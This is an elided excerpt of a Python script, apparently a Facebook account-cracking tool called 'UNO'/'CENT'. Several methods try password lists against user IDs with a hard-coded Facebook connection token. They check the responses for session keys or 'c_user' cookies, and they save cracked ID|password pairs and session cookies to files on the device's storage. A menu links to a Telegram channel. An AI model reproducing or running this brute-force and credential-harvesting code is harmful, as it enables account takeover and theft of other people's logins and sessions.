...
def result(OKs,cps):
    ...
    if len(OKs) != 0 or len(cps) != 0:
        ...
        input("Press enter to back UNO Menu ")
...
def CENTSU():   
    ...
    if select =='1':
        ...
        os.system('xdg-open https://t.me/hatdog_ni_nico')
...
class main_CENT():
    ...
    def methodA(self, sid, name, psw):
        ...
        try:
            ...
            sys.stdout.write(f"\r {S}>>>>>[UNO]<<<<< | M1 OK ╬ CP {len(oks)}/{len(cps)} | {loop} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    break
                     ...
                     #print(f"\r{A} [UNO-CP] {sid} | {ps} {S}")

                     os.system('espeak -a 300 " oh shit Cp ID"')

                     cps.append(sid)

                     open('/sdcard/UNO_CP.txt','a').write(sid+'|'+ps+'\n')
    ...
    def methodC(self, sid, name, psw):
        ...
        try:
            ...
            sys.stdout.write(f"\r {S}[UNO] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        ...
        sys.stdout.write(f"\r\033[1;32m[UNO] \033[1;33m{loop} \033[1;32m| \033[1;34mM3 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\033[97;1m=======================[UNO]======================")

                    oks.append(sid)

                    open('/sdcard/UNO_OK_ids_M4.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/CENT_iDs_COOKiEs_M4.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')
